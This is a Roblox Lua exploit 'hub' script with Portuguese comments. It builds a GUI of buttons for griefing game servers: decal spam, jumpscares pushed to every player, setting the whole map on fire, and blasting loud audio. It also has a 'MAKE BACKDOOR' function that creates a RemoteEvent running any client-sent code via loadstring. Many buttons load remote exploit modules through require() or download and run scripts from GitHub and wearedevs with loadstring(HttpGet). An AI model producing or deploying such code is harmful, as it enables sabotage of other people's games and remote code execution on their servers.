--====================================
-- GUI PRINCIPAL IGA HUB VK2 - FINAL (SEM C00LIGA93 REALM)
--====================================

local TargetPlayerName = "allahc00liga93"
local Players = game:GetService("Players")
local player = Players:FindFirstChild(TargetPlayerName) or Players.LocalPlayer
local ContentProvider = game:GetService("ContentProvider")

-- Preload dos assets principais para garantir carregamento
local assetsToPreload = {
    "rbxassetid://95910441484376",   -- Decal/imagem principal (decal spam, particles, skybox, fundo, jumpscare)
    "rbxassetid://1837258874",       -- Música do theme
    "rbxassetid://80776947525537",   -- Som do jumpscare
}
ContentProvider:PreloadAsync(assetsToPreload)
print("Assets principais preloadados com sucesso!")

-- Cria GUI
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "IGAHUBVK2"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 260, 0, 330)
frame.Position = UDim2.new(0.02,0,0.2,0)
frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
frame.BackgroundTransparency = 0.35
frame.Active = true
frame.Draggable = true

local fundo = Instance.new("ImageLabel", frame)
fundo.Size = UDim2.new(1,0,1,0)
fundo.BackgroundTransparency = 1
fundo.Image = "rbxassetid://95910441484376"
fundo.ImageTransparency = 0.3
fundo.ZIndex = 0

-- Container botões
local container = Instance.new("ScrollingFrame", frame)
container.Size = UDim2.new(1,0,1,0)
container.BackgroundTransparency = 1
container.ScrollBarThickness = 6
container.CanvasSize = UDim2.new(0,0,0,0)
container.ZIndex = 2

local layout = Instance.new("UIListLayout", container)
layout.Padding = UDim.new(0,6)
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    container.CanvasSize = UDim2.new(0,0,0,layout.AbsoluteContentSize.Y+10)
end)

-- Criador de Botão
local function criarBotao(nome, func)
    local b = Instance.new("TextButton", container)
    b.Size = UDim2.new(0,230,0,30)
    b.Text = nome
    b.BackgroundColor3 = Color3.fromRGB(25,25,25)
    b.TextColor3 = Color3.fromRGB(255,255,255)
    b.BorderSizePixel = 0
    b.ZIndex = 3
    b.Font = Enum.Font.GothamBold
    b.TextScaled = true
    b.MouseButton1Click:Connect(func)
end

------------------------------------------------
--=========== FUNÇÕES ORIGINAIS HUB ============
------------------------------------------------

local decalID = "95910441484376"
local function spamDecal()
    task.wait(0.5)
    local count = 0
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
                local d = Instance.new("Decal")
                d.Texture = "rbxassetid://"..decalID
                d.Face = face
                d.Transparency = 0
                d.Parent = obj
                count += 1
                if count % 100 == 0 then task.wait() end
            end
        end
    end
    print("Decal Spam concluído!")
end

local function jumpscare()
    for _,plr in pairs(Players:GetPlayers()) do
        local g = Instance.new("ScreenGui", plr.PlayerGui)
        g.Name="SCREAM"

        local img = Instance.new("ImageLabel", g)
        img.Size = UDim2.new(1,0,1,0)
        img.BackgroundTransparency = 1
        img.Image = "rbxassetid://95910441484376"
        img.ZIndex = 999

        local sound = Instance.new("Sound", workspace)
        sound.SoundId = "rbxassetid://80776947525537"
        sound.Volume = 5
        sound:Play()

        sound.Ended:Connect(function()
            g:Destroy()
            sound:Destroy()
        end)
    end
end

local particlesID = "rbxassetid://95910441484376"
local function particles()
    task.wait(0.3)
    local chr = player.Character
    if not chr then return end
    for _, part in ipairs(chr:GetDescendants()) do
        if part:IsA("BasePart") then
            local p = Instance.new("ParticleEmitter", part)
            p.Texture = particlesID 
            p.Rate = 40
            p.Speed = NumberRange.new(3,5)
        end
    end
end

local doritos1 = "rbxassetid://17697464540"
local doritos2 = "rbxassetid://5025889927"
local function doritos()
    local chr = player.Character
    if not chr then return end
    for _, part in ipairs(chr:GetDescendants()) do
        if part:IsA("BasePart") then
            local p1 = Instance.new("ParticleEmitter", part)
            p1.Texture = doritos1 
            p1.Rate = 30

            local p2 = Instance.new("ParticleEmitter", part)
            p2.Texture = doritos2 
            p2.Rate = 30
        end
    end
end

local skyID = "rbxassetid://95910441484376"
local function skybox()
    task.wait(0.3)
    local L = game:GetService("Lighting")
    local sk = L:FindFirstChildOfClass("Sky") or Instance.new("Sky", L)
    sk.SkyboxBk = skyID sk.SkyboxDn = skyID sk.SkyboxFt = skyID
    sk.SkyboxLf = skyID sk.SkyboxRt = skyID sk.SkyboxUp = skyID
end

local function msg()
    local m = Instance.new("Message", workspace)
    m.Text = "F00T0SP0S97 HERE"
    task.delay(5,function() m:Destroy() end)
end

local function hint()
    local h = Instance.new("Hint", workspace)
    h.Text = "TEAM IGA"
end

-- Função realm mantida (caso queira usar no futuro), mas sem botão
local function realm()
    local p = Instance.new("Part", workspace)
    p.Size = Vector3.new(10,20,1)
    p.Anchored = true
    p.Position = Vector3.new(0,10,0)
    p.BrickColor = BrickColor.new("Black")
end

local function bot666()
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            obj.BrickColor = BrickColor.new("Really black")
            local fire = Instance.new("Fire", obj)
            fire.Heat = 10 fire.Size = 5
        end
    end
end

local function shedlesky()
    local s = Instance.new("Sky")
    s.Name = "SKY"
    s.SkyboxBk = "http://www.roblox.com/asset/?id=172423468"
    s.SkyboxDn=s.SkyboxBk s.SkyboxFt=s.SkyboxBk s.SkyboxLf=s.SkyboxBk s.SkyboxRt=s.SkyboxBk s.SkyboxUp=s.SkyboxBk
    s.Parent = game.Lighting
end

local function anonymous()
    local SoundService = game:GetService("SoundService")
    local music = Instance.new("Sound", SoundService)
    music.SoundId = "rbxassetid://1840712882"
    music.Volume = 10
    music.PlaybackSpeed = 0.7
    music.Looped = true
    music:Play()
end

local function iluminati()
    local t3 = "http://www.roblox.com/asset/?id=261113277"
    local sky = Instance.new("Sky",game.Lighting)
    sky.SkyboxBk=t3 sky.SkyboxDn=t3 sky.SkyboxFt=t3 sky.SkyboxLf=t3 sky.SkyboxRt=t3 sky.SkyboxUp=t3
end

local function makeBackdoor()
    local server = Instance.new("RemoteEvent", game.ReplicatedStorage)
    server.OnServerEvent:Connect(function(player, SS)
        loadstring(SS)()
    end)
end

local function F00t0sp0s97Theme()
    local sound = Instance.new("Sound", workspace)
    sound.SoundId = "rbxassetid://1837258874"
    sound.Volume = 3
    sound.PlaybackSpeed = 1
    sound.Looped = false
    sound.Loaded:Wait()
    sound:Play()
end

---------- SKELETONS -----------

local function skeletons()
    local imgs={
        "http://www.roblox.com/asset/?id=169585459",
        "http://www.roblox.com/asset/?id=169585475",
        "http://www.roblox.com/asset/?id=169585485",
        "http://www.roblox.com/asset/?id=169585502",
        "http://www.roblox.com/asset/?id=169585515",
        "http://www.roblox.com/asset/?id=169585502",
        "http://www.roblox.com/asset/?id=169585485",
        "http://www.roblox.com/asset/?id=169585475"
    }

    local sp = Instance.new("Sound",workspace)
    sp.SoundId="rbxassetid://4808613510"
    sp.Volume=10 sp.Looped=true sp:Play()

    local sky=Instance.new("Sky",game.Lighting)

    task.spawn(function()
        while true do
            for _,i in ipairs(imgs) do
                sky.SkyboxBk=i sky.SkyboxDn=i sky.SkyboxFt=i
                sky.SkyboxLf=i sky.SkyboxRt=i sky.SkyboxUp=i

                local part=Instance.new("ParticleEmitter",workspace.Terrain)
                part.Texture=i part.Rate=250
                part.Speed=NumberRange.new(4,10)
                part.Lifetime=NumberRange.new(3)
                game.Debris:AddItem(part,3)

                task.wait(0.25)
            end
        end
    end)
end

-------------- k00pgui --------------

local function k00pgui()
    loadstring("require(15267263357).V11('"..player.Name.."')")()
end

-------------- BOTÕES ADICIONAIS (REQUIRES) --------------

local function grabKnifeV4()
    require(18665717275).load(player.Name)
end

local function thomas()
    require(85704103303160).Thomas(player.Name)
end

local function banHammer()
    require(5448035802).Hammer(player.Name, "BanHammer")
end

local function grabKnifeClassic()
    require(2872994194).bruh("mode1", "mode2", player.Name)
end

local function vanTroll()
    require(2500657841).load(player.Name)
end

local function serverDestroyer()
    require(2500743596).load(player.Name)
end

local function trollGui()
    require(2500686011).load(player.Name)
end

local function earRape()
    require(5802346180).eliza(player.Name)
end

local function cannonX()
    require(7661712858).Load(player.Name)
end

local function backroomsEffect()
    require(12313683305).backrooms()
end

local function opAdmin()
    require(127445614272366).op(player.Name)
end

local function blueSpooky()
    require(132099457182422):blue2spooky(player.Name)
end

local function spaceEffect()
    require(5702244094).space(player.Name)
end

local function flingKnife()
    require(1701771279).load(player.Name)
end

local function btTools()
    require(2437981989).load(player.Name)
end

local function swordFling()
    require(4688657372).load(player.Name)
end

local function pianoSheet()
    require(2490990319).load()
end

local function discoEffect()
    require(4596934055).load()
end

local function feFlingAll()
    require(3665674704).load(player.Name)
end

local function cmdX()
    require(12934961066).load(player.Name)
end

local function revizAdmin()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Loader.lua"))()
end

local function infiniteYield()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end

local function dexExplorer()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
end

local function darkDex()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BinahScript/Dark-Dex-V4/main/Dark%20Dex%20V4.lua"))()
end

local function owlHub()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))()
end

------------------------------------------------
--============== BOTÕES DO HUB =================
------------------------------------------------

criarBotao("DECAL SPAM", spamDecal)
criarBotao("JUMPSCARE", jumpscare)
criarBotao("PARTICLES", particles)
criarBotao("DORITOS PARTICLES", doritos)
criarBotao("SKYBOX", skybox)
criarBotao("MSG", msg)
criarBotao("HINT", hint)
criarBotao("666", bot666)
criarBotao("SHEDLESKY", shedlesky)
criarBotao("ANONYMOUS", anonymous)
criarBotao("ILUMINATI", iluminati)
criarBotao("MAKE BACKDOOR", makeBackdoor)
criarBotao("F00T0SP0S97 THEME", F00t0sp0s97Theme)

criarBotao("SKELETONS", skeletons)
criarBotao("k00pgui", k00pgui)

criarBotao("GRAB KNIFE V4", grabKnifeV4)
criarBotao("THOMAS", thomas)
criarBotao("BAN HAMMER", banHammer)
criarBotao("GRAB KNIFE CLASSIC", grabKnifeClassic)
criarBotao("VAN TROLL", vanTroll)
criarBotao("SERVER DESTROYER", serverDestroyer)
criarBotao("TROLL GUI", trollGui)
criarBotao("EAR RAPE", earRape)
criarBotao("CANNON X", cannonX)
criarBotao("BACKROOMS", backroomsEffect)
criarBotao("OP ADMIN", opAdmin)
criarBotao("BLUE SPOOKY", blueSpooky)
criarBotao("SPACE EFFECT", spaceEffect)
criarBotao("FLING KNIFE", flingKnife)
criarBotao("BT TOOLS", btTools)
criarBotao("SWORD FLING", swordFling)
criarBotao("PIANO TROLL", pianoSheet)
criarBotao("DISCO EFFECT", discoEffect)
criarBotao("FE FLING ALL", feFlingAll)
criarBotao("CMD-X", cmdX)
criarBotao("REVIZ ADMIN", revizAdmin)
criarBotao("INFINITE YIELD", infiniteYield)
criarBotao("DEX EXPLORER", dexExplorer)
criarBotao("DARK DEX", darkDex)
criarBotao("OWL HUB", owlHub)

print("IGA HUB VK2 carregado com sucesso! Botão C00LIGA93 REALM removido.")